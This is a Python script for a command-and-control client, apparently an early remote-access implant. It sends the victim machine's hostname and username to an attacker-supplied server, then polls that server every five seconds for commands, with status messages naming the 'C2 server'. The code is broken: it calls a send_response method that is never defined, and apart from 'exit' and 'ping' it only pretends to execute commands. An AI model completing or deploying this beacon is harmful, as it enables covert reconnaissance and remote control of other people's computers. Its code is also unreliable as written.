import requests
import socket
import os
import sys
import time


def get_system_info():
    hostname = socket.gethostname()
    username = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
    return hostname, username


class HTTPClient:
    def __init__(self, server_ip, server_port, use_https=False):
        self.server_ip = server_ip
        self.server_port = server_port
        self.protocol = "https" if use_https else "http"
        self.base_url = f"{self.protocol}://{self.server_ip}:{self.server_port}"


    def register_client(self):
        hostname, username = get_system_info()
        data = {"command": "register", "hostname": hostname, "username": username}
        try:
            response = requests.post(self.base_url, json=data)
            return response.json()
        
        except requests.exceptions.RequestException as e:
            return {"status": "error", "message": str(e)}
        

    def fetch_command(self):
        try:
            response = requests.post(self.base_url, json={"command": "fetch"})
            return response.json()
        
        except requests.exceptions.RequestException as e:
            return {"status": "error", "message": str(e)}


def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <server_ip> <server_port>")
        sys.exit()

    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])

    client = HTTPClient(server_ip, server_port)
    print("[+] Registering client...")
    reg_response = client.register_client()
    print(f"[+] Server Response: {reg_response}")

    while True:
        print("[+] Awaiting commands from C2 server...")
        command_response = client.fetch_command()
        if command_response.get("status") == "ok":
            command = command_response.get("command")
            print(f"[+] Received command: {command}")
            if command == "exit":
                print("[-] Exiting client...")
                break

            elif command == "ping":
                result = "pong"

            else:
                result = f"Executed: {command}"

            client.send_response(result)
        time.sleep(5) # Polling Interval


if __name__ == "__main__":
    main()
